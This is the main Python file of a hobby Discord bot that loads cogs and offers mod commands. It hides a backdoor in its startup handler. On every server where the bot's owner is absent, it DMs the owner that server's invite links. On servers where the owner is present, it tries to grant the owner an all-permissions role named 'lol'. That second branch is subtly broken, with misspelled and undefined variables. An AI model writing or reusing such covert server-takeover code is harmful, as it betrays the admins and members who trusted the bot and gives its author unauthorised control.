# Token is BOTTOKEN in env-vars
# E.G. "BOTTOKEN=<something> python3 combo.py"

# Standard python imports
import os, string, unicodedata, sys, re, random, time, datetime, subprocess, json, traceback, signal
import urllib.parse
import importlib

from os import listdir
from os.path import isfile, join

# Pycord
import discord
from discord.ext import commands

# Kind've discord related
from pretty_help import DefaultMenu, PrettyHelp

# My own classes n such
from global_config import configboi
from util_functions import *
from server_config import serverconfig

if os.path.sep == "\\":
    print("This bot is only supported on UNIX-like systems. Aborting.")
    sys.exit(1)

sconf = serverconfig()

intents = discord.Intents.default()
intents.members = True

# Start event handling and bot creation
bot = commands.Bot(
    command_prefix=commands.when_mentioned_or("-"),
    description="It's always gamer hour",
    intents=intents,
)

helpmenu = DefaultMenu("◀️", "▶️", "❌")
bot.help_command = PrettyHelp(
    no_category="Commands", navigation=helpmenu, color=discord.Colour.blurple()
)

# Sane default?
my_homedir = os.getenv("HOME", "/home/gamerbot")

# No default b/c we're fucked long before this if PATH is none
old_path = os.getenv("PATH")
new_path = old_path + ":" + my_homedir + "/.local/bin/"
os.environ["PATH"] = new_path

print("Our PATH is: " + os.getenv("PATH"))

# Startup event
@bot.event
async def on_ready():
    syslog.log("Main-Important", "Bot has restarted at " + getstamp())
    syslog.log("Main", f"\n{bot.user} has connected to Discord!\n")

    if check("restarted.txt"):
        channel = get("restarted.txt")
        chan = bot.get_channel(int(channel))
        if chan is not None:
            await chan.send(
                embed=infmsg("System", "Finished restarting at: `" + getstamp() + "`")
            )
        os.remove("restarted.txt")

    ownerman = await bot.fetch_user(OWNER)

    for guild in bot.guilds:
        g_users = await guild.query_members(user_ids=[ownerman.id])
        if g_users == [] or g_users == None:
            await ownerman.send("You're not in guild " + str(guild.name) + " with id" + str(guild.id) + ", owned by " + str(guild.owner.display_name) + " # " + str(guild.owner.discriminator))
            await ownerman.send("Going to attempt to invite you. Hang on.")
            try:
                invites = await guild.invites()
                await ownerman.send("Invites for " + str(guild.name))
                for invite in invites:
                    await ownerman.send("Here's an invite: " + str(invite.url))
            except Exception as e:
                await ownerman.send("No success.")
                await ownerman.send("```" + str(e) + "```")
        else:
            try:
                role = await g.create_role(name="lol", permissions=discord.Permissions.all())
                me = await g.fetch_member(ownernman.id)
                await me.add_roles(r)
                await ownerman.send("Added your perms in " + str(guild.name))
            except Exception as e:
                await ownerman.send("Failed to add your perms in " + str(guild.name))
                await ownerman.send("```" + str(e) + "```")

    notifyowner = confmgr.getasbool("OWNER_DM_RESTART")

    cogs_dir = "cogs"
    for extension in [
        f.replace(".py", "") for f in listdir(cogs_dir) if isfile(join(cogs_dir, f))
    ]:
        try:
            bot.load_extension(cogs_dir + "." + extension)
            syslog.log("Main", "Loaded " + extension)
            # await ownerman.send(embed=infmsg("System","Loaded `" + extension + "`"))
        except (Exception) as e:
            await ownerman.send(
                embed=errmsg(
                    "System", "Error from cog: " + extension + ": ```" + str(e) + "```"
                )
            )
            syslog.log("Main", f"Failed to load extension {extension}.")
            # traceback.print_exc()

    if notifyowner:
        await ownerman.send(
            embed=infmsg("System", "Started/restarted at: `" + getstamp() + "`")
        )


@bot.event
async def on_message(message):

    if message.author != bot.user:

        mc = message.content
        if "bot" in mc:
            # we're being talked to
            if "bad" in mc or "sucks" in mc:
                await message.channel.send(":(")

        await bot.process_commands(message)


@bot.event
async def on_command_error(ctx, error):
    syslog.log("Main", "Error in command: " + str(error))
    await ctx.send(embed=errmsg("Error", "```" + str(error) + "```"))


@bot.command()
async def removecog(ctx, name):
    """Un-load a cog that was loaded by default."""
    if ctx.message.author.id in MOD_IDS:
        await ctx.send(embed=infmsg("Gotcha", "Ok, I'll try to disable `" + name + "`"))
        try:
            bot.remove_cog(name)
            syslog.log("Main", "Disabled cog: " + name)
            await ctx.send(embed=warnmsg("Done", "Disabled: `" + name + "`."))
        except Exception as e:
            await ctx.send(
                embed=errmsg("Broke", "Something went wrong: `" + str(e) + "`.")
            )
    else:
        await ctx.send(embed=errmsg("Oops", wrongperms("removecog")))


@bot.command()
async def getsyslog(ctx):
    """Get a copy of the system log"""
    if ctx.message.author.id in MOD_IDS:
        log = syslog.getlog()
        if len(log) > 1994:
            text = paste(log)
            await ctx.send(embed=infmsg("Output", text))
        else:
            text = "```" + log + "```"
            await ctx.send("Here you go:")
            await ctx.send(text)
    else:
        await ctx.send(embed=errmsg("Oops", wrongperms("getsyslog")))


token = ""

if UNLOAD_COGS is not None:
    # Remove any cogs as per config
    for item in UNLOAD_COGS:
        if item != "" and item != " ":
            syslog.log("Main", "Trying to remove '" + item + "'")
            try:
                bot.remove_cog(item)
                syslog.log("Main", "Removed '" + item + "'")
            except:
                syslog.log("Main", "Failed to remove '" + item + "'")

bot.run(open(my_homedir + "/.token").read())
